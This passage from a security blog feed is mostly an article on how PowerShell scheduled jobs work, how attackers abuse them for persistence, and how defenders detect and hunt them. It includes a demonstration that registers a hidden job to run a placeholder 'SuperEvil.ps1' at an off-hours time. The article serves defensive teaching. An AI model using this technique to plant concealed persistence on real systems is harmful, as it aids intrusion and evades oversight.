&lt;li&gt;Checkout the rest of &lt;a href=&#34;https://ericzimmerman.github.io/#!index.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Eric Zimmerman’s awesome tools!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;If you need to explore a &lt;strong&gt;forensic&lt;/strong&gt; &lt;strong&gt;image&lt;/strong&gt; or &lt;strong&gt;memory dump&lt;/strong&gt;, I can recommend some &lt;a href=&#34;https://github.com/Purp1eW0lf/Blue-Team-Notes#Digital-Forensics&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;cheat sheets&lt;/a&gt; (shameless plug) on leveraging tools like &lt;a href=&#34;https://github.com/volatilityfoundation/volatility/wiki&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Volatility&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;For more information on DFIR techniques, &lt;a href=&#34;https://www.youtube.com/c/13cubed/videos&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Richard Davis 13Cubed videos&lt;/a&gt; &lt;a href=&#34;https://www.youtube.com/c/13cubed/videos&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;/a&gt;are essential educational resources&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When you’re next tasked with &lt;strong&gt;a log-less investigation&lt;/strong&gt;, see if you can leverage &lt;strong&gt;PowerShell history, prefetch, shimcache, and the USN journal&lt;/strong&gt; to identify any undiscovered nuance to your adversaries’ campaign. &lt;/p&gt;
&lt;p&gt;Any questions, comments, or criticisms please drop me a line&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter&lt;/a&gt; &lt;a href=&#34;https://github.com/Purp1eW0lf/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Dray Agha,&lt;/strong&gt; Security Researcher&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>PowerShell Jobs</title>
      <link>//localhost:1313/articles/2021/10/2021-10-07-powershell-jobs/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2021/10/2021-10-07-powershell-jobs/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://twitter.com/Purp1eW0lf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;By Dray Agha&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/Jumpsec_icons_Detection-1.png&#34; alt=&#34;Jumpsec icons Detection 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC investigators recently observed an adversary weaponising PowerShell Jobs to schedule their attack, whilst responding to an incident. In this article, we discuss what PowerShell jobs are, how they can be leveraged for malicious purposes, and how defenders can protect, detect, and respond to neutralise the threat. &lt;/p&gt;
&lt;h1&gt;What are PowerShell Jobs&lt;/h1&gt;&lt;p&gt;Adversaries are known to &lt;a href=&#34;https://attack.mitre.org/techniques/T1053/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;schedule parts&lt;/a&gt; of their campaign once they have infiltrated a target network. They may timetable their attack for an opportune moment (such as during unsociable hours, based on the region in which the infrastructure is hosted, or support teams reside) or set up a recurring task to ensure ongoing &lt;a href=&#34;https://attack.mitre.org/tactics/TA0003/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;persistence&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/psscheduledjob/?view=powershell-5.1&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PowerShell jobs&lt;/a&gt; aren’t designed to be inherently malicious and have many legitimate use cases. However, as is often the case in cyber security, the innate functionality of PowerShell Jobs and its susceptibility to abuse means it can also be leveraged by an adversary. &lt;/p&gt;
&lt;h2&gt;Using legitimately&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-legitimately&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-legitimately&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;When using the command line for most operating systems, users have to run a command and wait a microsecond for the system to return with a reply. This can be inconvenient - for example, when running a script that will take a while to run, or when you know that you want to run the command at a specific time or date in the future. &lt;/p&gt;
&lt;p&gt;When using PowerShell, a job allows you to push a task into the background. PowerShell will continue to work on your query behind the scenes and allow you to continue using the shell for other things. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Push command to the background&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Start-Job&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Retrieve the results of the backgrounded command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Receive-job&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;X&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image6-1024x407.png&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;According to schedule&lt;span class=&#34;absolute -mt-20&#34; id=&#34;according-to-schedule&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#according-to-schedule&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;PowerShell jobs can also be &lt;strong&gt;scheduled&lt;/strong&gt; to execute on very particular conditions&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#organise when the task should trigger&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Daily&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-At&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;4:15 AM&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DaysInterval&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#register the PowerShell job&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Register-ScheduledJob&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Collect_date&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ScriptBlock&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Trigger&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image15-1-1024x234.png&#34; alt=&#34;image15 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;There are numerous ways to go and find where our scheduled job is located&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#Either of these work just fine&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-id&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledTask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-taskname&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image14-1024x155.png&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image10-1024x166.png&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;We can also find out a scheduled job’s date, time, and frequency are due to be executed&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image4.png&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h1&gt;Malicious scheduled jobs&lt;/h1&gt;&lt;p&gt;In the above example, we’re completing the rather boring scheduled job of collecting the date. A more interesting representative example of how PowerShell jobs can be leveraged by attackers was found during our response to a recent incident. &lt;/p&gt;
&lt;p&gt;Whilst this article won’t recreate the exact syntax the attacker used for obvious reasons, we’ve provided a functionally similar example below.&lt;/p&gt;
&lt;h2&gt;Using for evil&lt;span class=&#34;absolute -mt-20&#34; id=&#34;using-for-evil&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#using-for-evil&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let’s schedule a malicious PowerShell Job to run at &lt;strong&gt;3 o’clock in the morning on Christmas Day&lt;/strong&gt; - a gift to incident responders and sysadmins everywhere!&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#schedule the job for Christmas&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-JobTrigger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Once&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-At&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;12/25/2021 3:00 AM&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#point to the malicious script to execute&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SuperEvil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#try to hide this job from the Task Scheduler GUI….will still show up in the command line and GUI (if the right options are selected in ‘View’)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-ScheduledJobOption&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HideInTaskScheduler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#and now schedule the job&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Register-ScheduledJob&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Christmas_Day&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-FilePath&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Trigger&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$trigger&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;–&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ScheduledJobOption&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image13-1024x228.png&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Now, we’ve emulated how an adversary could weaponise a PowerShell job to strike when the defenders are less likely to be able to manually react and respond. In these cases, automated measures to prevent and detect the threat are essential.&lt;/p&gt;
&lt;h1&gt;Hunting Malicious Jobs&lt;/h1&gt;&lt;p&gt;Now, you know me, I&amp;rsquo;m not about to show you something malicious without showing you the defensive counterpart! Let&amp;rsquo;s put our Blue Team hat on&lt;/p&gt;
&lt;h2&gt;Monitoring&lt;span class=&#34;absolute -mt-20&#34; id=&#34;monitoring&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#monitoring&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;From a monitoring and detection point of view, if we combine &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#:~:text=System%20Monitor%20%5c%28Sysmon%5c%29%20is%20a,changes%20to%20file%20creation%20time.&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Sysmon&lt;/a&gt; and &lt;a href=&#34;https://github.com/Neo23x0/sysmon-config&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Florian Roth’s&lt;/a&gt; config of rules, we can see how a PowerShell job would be flagged&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image11.png&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The BLUE arrows: event info
&lt;ul&gt;
&lt;li&gt;The Event ID 11 involves file creation&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The RED arrows: specific info
&lt;ul&gt;
&lt;li&gt;TargetFileName shows that the scheduled job has been written to the Task directory&lt;/li&gt;
&lt;li&gt;Notice, however, we have no visibility to WHAT this task does….we just know it has been registered.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The PINK arrow: MITRE ATT&amp;amp;CK reference
&lt;ul&gt;
&lt;li&gt;This may not be in every sysmon config. However Florian Roth includes the MITRE ATT&amp;amp;CK tactic number in a particular event. This allows security analysts to schematise the event data they are observing with the wider TTPs of an adversary. &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the above sysmon/endpoint log based SIEM, we would &lt;em&gt;have&lt;/em&gt; some visibility of scheduled jobs. However this data won&amp;rsquo;t be enough for an analyst to work with. We need to dig deeper beyond &lt;strong&gt;passive monitoring&lt;/strong&gt; to &lt;strong&gt;active threat hunting&lt;/strong&gt; to identify exactly what this scheduled job is about. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/image8.png&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h2&gt;Hunting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;hunting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#hunting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In our JUMPSEC clients’ environments, we have found no system-level usage of scheduled jobs. This suggests that scheduled jobs you identify are deliberately put there and are worth investigation.&lt;/p&gt;
&lt;p&gt;You can query the scheduled jobs on a machine with this straight forward command&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;images/image5-1024x177.png&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;You can also examine &lt;em&gt;when&lt;/em&gt; this scheduled job is due to be executed&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-ScheduledJob&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-JobTrigger&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Ft &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Property&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Label&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ScheduledJob&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;={&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;JobDefinition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}},&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;At&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;frequency&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DaysOfWeek&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
